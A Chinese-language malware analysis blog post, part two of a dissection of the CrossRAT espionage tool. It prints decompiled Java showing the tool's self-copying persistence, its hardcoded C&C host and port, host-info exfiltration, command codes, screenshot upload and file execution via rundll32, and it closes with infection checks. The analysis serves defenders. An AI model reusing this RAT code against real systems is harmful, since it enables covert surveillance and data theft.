> 原文链接: https://www.anquanke.com//post/id/96383 


# 分析一款全球网络间谍活动中的跨平台恶意软件-CrossRAT（下）


                                阅读量   
                                **120857**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01da8d97ced3eeb223.jpg)](https://p3.ssl.qhimg.com/t01da8d97ced3eeb223.jpg)

## 写在前面的话

本系列文章将跟大家介绍一款名叫CrossRAT的跨平台恶意软件，该工具可以针对Windows、macOS以及Linux这三大操作系统实施攻击。在本系列文章中的上集，我们给大家简单介绍了CrossRAT中’a’数据包（操作系统检测）以及‘b’数据包（持久化感染）的功能。接下来，我们将跟大家介绍CrossRAT中剩下的数据包功能以及恶意软件的核心逻辑。



## 继续分析

了解了CrossRAT中’a’数据包（操作系统检测）以及‘b’数据包（持久化感染）的功能之后，我们接下来讨论一下’org’数据包的功能，并深入分析这款恶意软件的核心逻辑。<br>[![](https://p1.ssl.qhimg.com/t01e0e9426d7b39a3f8.png)](https://p1.ssl.qhimg.com/t01e0e9426d7b39a3f8.png)<br>
org’数据包中包含了’a.a.a.’和’jnativehook’这两个数据包。通过对’a.a.a’数据包中的多个类文件进行分析之后，我们发现这个数据包中包含的代码主要负责进行文件的I/O操作。比如说，’a.a.a/b.class’中有如下所示的字符串数据：

```
$ strings - strings - src/org/a/a/a/b.class
does not exist
is not a directory
to a subdirectory of itself
already exists
cannot be written to
directory cannot be created
does not exist
exists but is a directory
exists but is read-only
Cannot move directory:
Destination must not be null
Failed to copy full contents from
Failed to delete original directory
Failed to list contents of
File does not exist:
Unable to delete file:
```

很明显，这部分代码将允许远程攻击者直接与受感染系统中的文件系统进行交互，并修改文件内容，这一点我们也可以直接从恶意软件代码中了解到。我们一起看一看’a.a.a/b.class’中的’a’方法，这个方法可以拷贝一个文件，并根据可选参数来对目标源文件进行修改：

```
private static void a(File paramFile1, File paramFile2, boolean paramBoolean)
`{`
if ((paramFile2.exists()) &amp;&amp; (paramFile2.isDirectory())) `{`
throw new IOException(“Destination ‘“ + paramFile2 + “‘ exists but is a directory”);
`}`
….
try
`{`
localFileInputStream = new FileInputStream(paramFile1);
localFileOutputStream = new FileOutputStream(paramFile2);
localFileChannel1 = localFileInputStream.getChannel();
localFileChannel2 = localFileOutputStream.getChannel();
l1 = localFileChannel1.size();
long l5;
for (l2 = 0L; l2 &lt; l1; l2 += l5)
`{`
long l4;
long l3 = (l4 = l1 - l2) &gt; 31457280L ? 31457280L : l4;
if ((l5 = localFileChannel2.transferFrom(localFileChannel1, l2, l3)) == 0L) `{`
break;
`}`
`}`
...
`}`
...
long l1 = paramFile1.length();
long l2 = paramFile2.length();
if (l1 != l2) `{`
  throw new IOException("Failed to copy full contents from '" + paramFile1 + "' to '" + 
                          paramFile2 + "' Expected length: " + l1 + " Actual: " + l2);
`}`
if(paramBoolean) `{`
  paramFile2.setLastModified(paramFile1.lastModified());
`}`
`}`
```

‘org’数据包中的另一个数据包名叫’jnativehook’，如果你在搜索引擎中搜索关于这个数据包的内容，你就会发现这其实是<br>
一个开源的Java代码库，该项目的GitHub地址在这里：【jnativehook】<br>
正如该项目作者所介绍的那样，该项目可以给Java程序提供一种键盘以及鼠标的全局监听器。这种功能无法在顶层Java代码中实现，因此这个代码库利用了独立于平台的本地代码来创建底层系统级的钩子，然后将鼠标和键盘点击事件发送给你的应用程序。鼠标以及键盘记录功能对于网络间谍工具来说肯定是非常重要的，这一点毫无疑问。但是，我并没有在这款恶意软件中发现有任何代码调用过’jnativehook’这个数据包，所以目前来说CrossRAT貌似还没有开始使用这个功能，我们也只能这样假设了。我们所分析的这个CrossRAT恶意软件样本当前版本号为v0.1，这可能意味着这款恶意软件仍然处于开发过程中，所以还有很多功能不够完善。<br>
接下来，我们一起深入分析一下CrossRAT的核心逻辑。



## CrossRAT的核心逻辑

这款恶意软件的主要核心逻辑实现在crossrat/client.class文件中。实际上，这个类文件中还包含了恶意软件的主入口点（public static `void main(String args[])）：<br>
grep -R main hmar6.jar/*

crossrat/client.jad: public static void main(String args[])`<br>
当恶意软件开始执行之后，将会调用这个main方法。调用之后，它将会执行以下任务：
1. 如果有必要的话，会根据目标操作系统来执行特定的持久化感染安装；
1. 检查远程C&amp;C服务器的命令；
<li>执行远程C&amp;C服务器发送过来的任何指令任务；<br>
首秀按，这款恶意软件会在目标主机中进行安装，并实现持久化感染。正如之前所介绍的那样，这种逻辑是操作系统指定型的，在设置持久化感染之前（例如注册表键和Launch Agent plist等等），恶意软件需要将自身文件（例如mediamgrs.jar）拷贝到特定位置。我在下方代码中添加了注释：</li>
```
public static void main(String args[])
`{`
Object obj;
supportedSystems = c.b();String tempDirectory;
//get temp directory
s = System.getProperty(s = “java.io.tmpdir”);

installDir = “”;

//Windows?
// build path to Windows install directory (temp directory)
if(supportedSystems.a() == c.a)
`{`

installDir = (new StringBuilder(String.valueOf(s)))
              .append("\").toString();
`}`

//Mac?
// build path to Mac install directory (~/Library)
else if(supportedSystems.a() == c.b)
`{`

userHome = System.getProperty("user.home");
installDir = (new StringBuilder(String.valueOf(userHome)))
              .append("/Library/").toString();
`}`

//Linux, etc?
// build path to Linux, etc install directory (/usr/var/)
else
`{`

installDir = "/usr/var/";
`}`

…在上面的代码中，一旦动态创建完成安装目录的路径之后，恶意软件便会将自身文件(mediamgrs.jar)拷贝到这个安装目录之中： 
public static void main(String args[])
`{`
…

//build full path and instantiate file obj
installFileObj = new File(installDir + “mediamgrs.jar”);

//copy self to persistent location
org.a.a.a.b.a(((File) (selfAsFile)), installFileObj);
```

…通过使用fs_usage命令，我们可以观察到这份文件的拷贝以及更新时间，而拷贝文件跟源文件是完全一模一样的：

```
# fsusage -w -f filesystem
open F=7 (R__) /Users/user/Desktop/hmar6.jar java.125131
lseek F=7 O=0x00000000 java.125131

open F=8 (WC_T) /Users/user/Library/mediamgrs.jar java.125131
pwrite F=8 B=0x3654f O=0x00000000 java.125131
close F=8 0.000138 java.125131
utimes /Users/user/Library/mediamgrs.jar java.125131

ls -lart /Users/user/Library/mediamgrs.jar
-rw-r—r— 1 user staff 222543 Jan 22 18:54 /Users/user/Library/mediamgrs.jar

ls -lart ~/Desktop/hmar6.jar
-rw-r—r— 1 user wheel 222543 Jan 22 18:54 /Users/user/Desktop/hmar6.jar
```

当恶意软件完成了自身文件的拷贝之后，它将会根据目标系统平台来执行相应的持久化感染逻辑。由于我们的测试环境是一台安装了macOS系统的虚拟机，因此恶意软件将会利用Launch Agent来实现持久化感染：

```
public static void main(String args[])
`{`
…
//persist: Windows
if ((localObject5 = a.c.b()).a() == a.c.a) `{`
paramArrayOfString = new b.e(paramArrayOfString, (String)localObject4, true);
`}`

//persist: Mac
else if (((a.a)localObject5).a() == a.c.b) `{`
  paramArrayOfString = new b.c(paramArrayOfString, (String)localObject4, true);
`}` 

//persist: Linux
else if ((((a.a)localObject5).d()) &amp;&amp; 
        (!GraphicsEnvironment.getLocalGraphicsEnvironment().isHeadlessInstance())) `{`
  paramArrayOfString = new b.d(paramArrayOfString, (String)localObject4, true);
`}` 
...

//error: unknown OS
else `{`
  throw new RuntimeException("Unknown operating system " + ((a.a)localObject5).c());
`}`</code>…</pre>
我们可以直接通过查看文件系统来观察恶意软件的持久化感染情况：
<p>[![](https://p3.ssl.qhimg.com/t01278255b62c0f7366.png)](https://p3.ssl.qhimg.com/t01278255b62c0f7366.png)<br>
当恶意软件完成了持久化感染之后，它将会尝试连接远程C&amp;C服务器，并检查服务器发送过来的命令。根据EFF/Lookout提供的研究报告，改恶意软件将会尝试连接flexberry.com，通信端口为2223。<br>
其中，远程C&amp;C服务器的信息是硬编码在crossrat/k.class文件中的：</p>
[![](https://p1.ssl.qhimg.com/t01edbe16e8514a084f.png)](https://p1.ssl.qhimg.com/t01edbe16e8514a084f.png)
<pre>`  ``{`<code class="hljs perl">…//connect to C&amp;C server
  Socket socket;
  (socket = new Socket(crossrat.k.b, crossrat.k.c)).setSoTimeout(0x1d4c0);

  ...
```

当恶意软件从远程C&amp;C服务器那里获取到了操作指令之后，它将会把受感染主机的信息（例如操作系统版本、主机名和用户名等等）发送给攻击者。生成主机信息的代码如下所示：

```
public static void main(String args[])
`{`
...
if((k.g = (k.h = Preferences.userRoot()).get("UID", null)) == null)
`{`
k.g = (k.f = UUID.randomUUID()).toString();
k.h.put("UID", k.g);
`}`
String s1 = System.getProperty("os.name");
String s2 = System.getProperty("os.version");
args = System.getProperty("user.name");
Object obj1;
obj1 = ((InetAddress) (obj1 = InetAddress.getLocalHost())).getHostName();
obj1 = (new StringBuilder(String.valueOf(args))).append("^")
.append(((String) (obj1))).toString();
...
```

接下来，恶意软件会对C&amp;C服务器返回的响应信息进行解析，然后寻找攻击者发送过来的命令并尝试执行。<br>
现在，你可能会想知道这款恶意软件到底会做哪些事情！也就是说，它到底有什么功能？幸运的是，EFF/Lookout的研究报告已经给我们提供了很多细节信息了。下面是报告中所介绍的crossrat/k.class部分代码，其中包含了CrossRAT的任务值：

```
// Server command prefixes
public static String m = "@0000"; // Enumerate root directories on the system. 0 args
public static String n = "@0001"; // Enumerate files on the system. 1 arg
public static String o = "@0002"; // Create blank file on system. 1 arg
public static String p = "@0003"; // Copy File. 2 args
public static String q = "@0004"; // Move file. 2 args
public static String r = "@0005"; // Write file contents. 4 args
public static String s = "@0006"; // Read file contents. 4 args
public static String t = "@0007"; // Heartbeat request. 0 args
public static String u = "@0008"; // Get screenshot. 0 args
public static String v = "@0009"; // Run a DLL 1 arg
```

使用了这些任务值的代码可以在crossrat/client.class文件中找到，正如之前所介绍的那样，恶意软件会解析C&amp;C服务器所返回的响应数据，并根据命令进行操作：

```
public static void main(String args[])
 `{`
 …
//enum root directories
if((args1 = args.split((new StringBuilder("\"))
    .append(crossrat.k.d).toString()))[0].equals(k.m))
`{`
    new crossrat.e();
    crossrat.e.a();
    f f1;
    (f1 = new f()).start();
`}` 

//enum files
else if(args1[0].equals(k.n))
    (args = new crossrat.c(args1[1])).start();

//create blank file
else if(args1[0].equals(k.o))
    (args = new crossrat.a(args1[1])).start();

//copy file
else if(args1[0].equals(k.p))
    (args = new crossrat.b(args1[1], args1[2])).start();

 ...`

```

接下来，我们来看看一些更加有趣的命令，比如说截屏和DLL加载。<br>
当恶意软件从远程C&amp;C服务器接收到了字符串”0008” (‘k.u’)之后，代码所创建的对象以及解析过程如下所示：

```
public static void main(String args[])
 `{`
 …
//C&amp;C server addr
public static String b = "flexberry.com";

//C&amp;C server port
public static int c = 2223;

//handle cmd: 0008
// pass in C&amp;C addr/port
else if(args1[0].equals(k.u))
  (args = new j(crossrat.k.b, crossrat.k.c)).start();
```

…上述代码中的’j’对象定义在crossrat/j.class文件之中：

[![](https://p2.ssl.qhimg.com/t0174f221e478d59c07.png)](https://p2.ssl.qhimg.com/t0174f221e478d59c07.png)

该恶意软件会通过java.awt.Robot().createScreenCapture方法来实现屏幕截图，在将截图文件发送到远程C&amp;C服务器之前，它会把截图文件临时保存在磁盘中（文件名随机，后缀为.jpg）。<br>
另一个有意思的命令是“0009”，当恶意软件从服务器端接收到这个命令之后，它会初始化一个’i’对象，该对象实现在crossrat/i.class文件之中：<br>[![](https://p4.ssl.qhimg.com/t01b652795e2e3e9774.png)](https://p4.ssl.qhimg.com/t01b652795e2e3e9774.png)<br>
当恶意软件在Windows设备上执行时，它将会调用rundll32来加载url.dll文件，并调用自己的FileProtocolHandler方法：

```
//open a file
Runtime.getRuntime().exec(new String[] `{`
“rundll32”, “url.dll,FileProtocolHandler”, file.getAbsolutePath()
`}`);
```

url.dll是一个合法的微软代码库，它可以用来在受感染系统中启动可执行文件。比如说，在Windows平台下，下列代码将会启动计算器程序：

```
//execute a binary
Runtime.getRuntime().exec(new String[] `{`
“rundll32”, “url.dll,FileProtocolHandler”, “calc.exe”
`}`);
```

在除Windows以外的平台上，‘0009’命令将会通过Desktop.getDesktop().open()方法来执行相应的文件：

```
execute a binary
else if ((locala.a() == c.b) || (locala.a() == c.c)) `{`
try
`{`
Desktop.getDesktop().open(localFile);
`}`
```



# <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

在这篇文章中，我们对近期在网络间谍活动中新发现的跨平台恶意软件CrossRAT进行了深入的技术分析。这款恶意软件可以感染多种操作系统平台，而且前的CrossRAT仍是v0.1版本，所以很多功能都还没有完善。因此研究人员认为，完善后的CrossRAT攻击能力将更加强大。

## 问答环节

#### <a class="reference-link" name="%E9%97%AE%E9%A2%98%EF%BC%9ACrossRAT%E7%9A%84%E4%B8%BB%E8%A6%81%E6%84%9F%E6%9F%93%E9%80%94%E5%BE%84%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"></a>问题：CrossRAT的主要感染途径是什么？

回答：目前，CrossRAT攻击者主要通过社交媒体平台、网络钓鱼、以及物理访问目标系统（包括硬件设备和软件账号）来实现恶意软件感染。

#### <a class="reference-link" name="%E9%97%AE%E9%A2%98%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BF%9D%E6%8A%A4%E8%87%AA%E5%B7%B1%E5%85%8D%E5%8F%97CrossRAT%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%9F"></a>问题：如何保护自己免受CrossRAT的攻击？

回答：由于CrossRAT是采用Java编程语言开发的，因此它的感染前提就是目标主机中必须安装了Java环境。幸运的是，新版本的macOS已经不会预安装Java环境了，因此绝大多数的macOS用户都应该是安全的。当然了，如果你的系统中安装了Java，或者攻击者强制性在你的计算机中安装了Java的话，你仍然是不安全的，即使是最新版的macOS（High Sierra）也不例外。<br>
目前绝大多数的反病毒检测系统都无法检测到CrossRAT。Virus Total的检测率为1/59，这相当于没有。因此，安装反病毒产品并不能保护用户的安全，不过这些工具可以帮助你检测系统中的可疑行为，并判断自己是否受到了感染。<br>
macOS或Linux用户可以使用‘ps’命令来判断自己是否感染了CrossRAT：<code><br>
$ ps aux | grep mediamgrs.jar<br>
user  01:51AM  /usr/bin/java -jar /Users/user/Library/mediamgrs.jar</code><br>
Windows用户可以检查HKCUSoftwareMicrosoftWindowsCurrentVersionRun注册表键来判断感染情况，如果发现了如下命令的话，说明你已经感染了：<br>`java, -jar and mediamgrs.jar`
